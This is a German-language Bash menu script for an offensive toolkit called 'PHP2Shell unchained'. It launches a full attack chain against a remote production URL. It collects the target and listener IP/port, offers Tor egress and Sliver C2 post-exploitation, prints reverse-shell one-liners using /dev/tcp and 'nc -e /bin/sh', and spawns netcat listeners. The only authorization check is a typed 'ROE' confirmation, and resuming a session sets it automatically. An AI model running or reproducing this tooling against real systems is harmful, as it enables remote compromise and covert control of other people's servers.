#!/usr/bin/env bash
# Remote-Engagement Submenü — Wizard + Scope-Verwaltung + Session-Steuerung.
# Wird aus dem Hauptmenü (Taste [e]) aufgerufen; kann auch direkt laufen.
set -euo pipefail
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
export LAB_ROOT="$ROOT"
# shellcheck source=scripts/docker-env.sh
source "$ROOT/scripts/docker-env.sh"
source "$ROOT/remote/lib/scope.sh"
source "$ROOT/remote/lib/term.sh"
source "$ROOT/remote/lib/state.sh"
ORCH="$ROOT/remote/orchestrate.sh"

hdr() {
  clear 2>/dev/null || true
  cat <<'BANNER'
  ┌──────────────────────────────────────────────────────────────┐
  │   PHP2Shell unchained — REMOTE ENGAGEMENT (Produktiv, RoE)   │
  └──────────────────────────────────────────────────────────────┘
BANNER
  local n=0
  [[ -f "$(scope_file)" ]] && n=$(grep -cv '^\s*\(#\|$\)' "$(scope_file)" || true)
  echo "  Scope-Einträge: $n · Terminal-Backend: $(term_backend) · CONFIRM_ROE: ${CONFIRM_ROE:-<nicht gesetzt>}"
  echo
}

pick_session() {
  local base="$ROOT/out/engage" i=1
  [[ ! -d "$base" ]] && { echo "Keine Sessions."; return 1; }
  local -a sids=()
  for d in "$base"/*/; do sids+=("$(basename "$d")"); done
  [[ ${#sids[@]} -eq 0 ]] && { echo "Keine Sessions."; return 1; }
  echo "  Sessions:"
  for s in "${sids[@]}"; do printf "    [%d] %s\n" "$i" "$s"; i=$((i+1)); done
  read -r -p "  Auswahl [1]: " c
  c="${c:-1}"
  [[ "$c" =~ ^[0-9]+$ ]] && (( c >= 1 && c <= ${#sids[@]} )) || return 1
  printf '%s' "${sids[$((c-1))]}"
}

cmd_scope() {
  hdr
  echo "  ── Scope (RoE-Nachweis: $(scope_file)) ──"
  echo
  if [[ -f "$(scope_file)" ]]; then cat -n "$(scope_file)"; else echo "  (leer — Datei existiert noch nicht)"; fi
  echo
  echo "  [a] Host/CIDR hinzufügen    [ENTER] zurück"
  read -r -p "  Auswahl: " c
  if [[ "$c" == "a" ]]; then
    read -r -p "  Host/CIDR: " h
    read -r -p "  RoE-Referenz (Ticket/Datum): " r
    [[ -n "$h" ]] && printf '%s  # RoE %s\n' "$h" "${r:-ohne Referenz}" >> "$(scope_file)"
    echo "  → eingetragen."
    sleep 1
  fi
}

cmd_run_wizard() {
  hdr
  echo "  ── Neues Engagement (Vollkette) ──"
  echo
  read -r -p "  Ziel-URL (z.B. https://staging.example/index.php): " url
  [[ -z "$url" ]] && return 0
  local host; host="$(scope_url_host "$url")"
  if ! scope_host_in "$host"; then
    echo
    echo "  ⚠ '$host' steht NICHT in scope-authorized.txt."
    read -r -p "  Jetzt eintragen? (RoE-Referenz oder leer=Abbruch): " r
    [[ -z "$r" ]] && { echo "  Abgebrochen."; sleep 1; return 0; }
    printf '%s  # RoE %s\n' "$host" "$r" >> "$(scope_file)"
  fi
  local lhost_def; lhost_def="$(ip -4 route get 1.1.1.1 2>/dev/null | grep -oP 'src \K[0-9.]+' || echo '')"
  read -r -p "  Listener-IP (LHOST) [${lhost_def}]: " lhost; lhost="${lhost:-$lhost_def}"
  read -r -p "  Listener-Port [4444]: " lport; lport="${lport:-4444}"
  read -r -p "  Tor-Egress für Recon/Probes? [j/N]: " tor
  read -r -p "  Post-Ex-Profil (none|sliver) [none]: " c2; c2="${c2:-none}"
  read -r -p "  Reverse-Shell-Varianten-Job (lukechilds) mit spawnen? [j/N]: " rs
  echo
  echo "  ── Zusammenfassung ──"
  echo "  Ziel:    $url"
  echo "  LHOST:   $lhost:$lport"
  echo "  Tor:     $([[ "$tor" =~ ^[jJ] ]] && echo on || echo off)"
  echo "  C2:      $c2"
  echo "  Backend: $(term_backend)"
  echo
  read -r -p "  START mit CONFIRM_ROE=I-AM-AUTHORIZED? Tippe ROE ein: " confirm
  [[ "$confirm" != "ROE" ]] && { echo "  Abgebrochen."; sleep 1; return 0; }

  export CONFIRM_ROE=I-AM-AUTHORIZED
  export ENGAGE_LHOST="$lhost" ENGAGE_LPORT="$lport" ENGAGE_C2="$c2" TARGET_URL="$url"
  [[ "$tor" =~ ^[jJ] ]] && export ENGAGE_TOR=on
  [[ "$rs" =~ ^[jJ] ]] && export ENGAGE_RS=on
  bash "$ORCH" run "$url"
  echo
  read -r -p "  ENTER für Menü… " _
}

cmd_resume() {
  hdr; local sid
  sid="$(pick_session)" || { sleep 1; return 0; }
  export CONFIRM_ROE="${CONFIRM_ROE:-I-AM-AUTHORIZED}"
  bash "$ORCH" resume "$sid"
  read -r -p "  ENTER für Menü… " _
}

cmd_status() { hdr; bash "$ORCH" status; echo; read -r -p "  ENTER für Menü… " _; }

cmd_listeners() {
  hdr; local sid
  sid="$(pick_session)" || { sleep 1; return 0; }
  bash "$ORCH" listeners "$sid"
  read -r -p "  ENTER für Menü… " _
}

cmd_report() {
  hdr; local sid
  sid="$(pick_session)" || { sleep 1; return 0; }
  local r="$ROOT/out/engage/$sid/REPORT.md"
  [[ -f "$r" ]] && ${PAGER:-less} "$r" || { echo "  Kein REPORT.md in $sid."; sleep 1; }
}

cmd_rshell_variants() {
  hdr
  echo "  ── Reverse-Shell-Varianten (lukechilds, Payloads + Listener) ──"
  echo
  if [[ ! -d "$ROOT/third_party/reverse-shell" ]]; then
    echo "  Noch nicht gefetcht."
    read -r -p "  Jetzt fetch-reverse-shell ausführen? [j/N]: " f
    [[ "$f" =~ ^[jJ] ]] && bash "$ROOT/scripts/fetch-reverse-shell.sh"
  fi
  read -r -p "  LHOST: " lh
  read -r -p "  LPORT [4445]: " lp; lp="${lp:-4445}"
  echo
  echo "  Payloads unter: https://github.com/lukechilds/reverse-shell#readme"
  echo "  Beispiele:  bash -i >& /dev/tcp/$lh/$lp 0>&1"
  echo "              nc $lh $lp -e /bin/sh"
  echo
  read -r -p "  Listener-Fenster auf $lp spawnen? [J/n]: " go
  if [[ ! "$go" =~ ^[nN] ]]; then
    mkdir -p "$ROOT/out/rshell"
    term_spawn_jobs "p2s-rshell" "$ROOT/out/rshell" \
      "listener-$lp|nc -lvnp $lp"
    echo "  Listener läuft (Backend: $(term_backend))."
  fi
  read -r -p "  ENTER für Menü… " _
}

main_loop() {
  while true; do
    hdr
    cat <<'MENU'
    [1] Scope verwalten          scope-authorized.txt (RoE) anzeigen/eintragen
    [2] Engagement STARTEN       Wizard: URL · LHOST · Tor · C2 → Vollkette
    [3] Resume                   unterbrochene Session fortsetzen
    [4] Status                   alle Sessions + Phasen-Fortschritt
    [5] Listener neu spawnen     Fenster für bestehende Session erneut öffnen
    [6] Report ansehen           REPORT.md der Session
    [7] Reverse-Shell-Varianten  lukechilds-Payloads + Listener-Spawn
    [0] Zurück

MENU
    read -r -p "  Auswahl: " c
    case "${c:-}" in
      1) cmd_scope ;;
      2) cmd_run_wizard ;;
      3) cmd_resume ;;
      4) cmd_status ;;
      5) cmd_listeners ;;
      6) cmd_report ;;
      7) cmd_rshell_variants ;;
      0|q|"") return 0 ;;
    esac
  done
}

main_loop
